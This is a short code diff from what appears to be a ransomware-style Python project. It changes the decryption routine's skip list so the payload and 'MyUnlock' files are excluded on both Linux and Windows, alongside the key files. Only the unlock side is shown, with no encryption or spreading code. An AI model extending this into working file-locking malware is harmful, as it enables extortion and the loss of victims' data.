@@ -56,8 +56,10 @@ for root, dirs, files in os.walk("."):
         # Do not decrypt the private/public key or payload or MyUnlock
         if(not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or
             filePath.endswith(constants.PUBLIC_KEY_FILE_PATH) or
-            filePath.endswith(constants.PAYLOAD_FILE_PATH) or
-            filePath.endswith(constants.MY_UNLOCK_FILE_PATH) or
+            filePath.endswith(constants.PAYLOAD_FILE_PATH_LINUX) or
+            filePath.endswith(constants.MY_UNLOCK_FILE_PATH_LINUX) or
+            filePath.endswith(constants.PAYLOAD_FILE_PATH_WIN) or
+            filePath.endswith(constants.MY_UNLOCK_FILE_PATH_WIN) or
             (not filePath.endswith(".json")) or
             os.path.isdir(filePath)
             )):
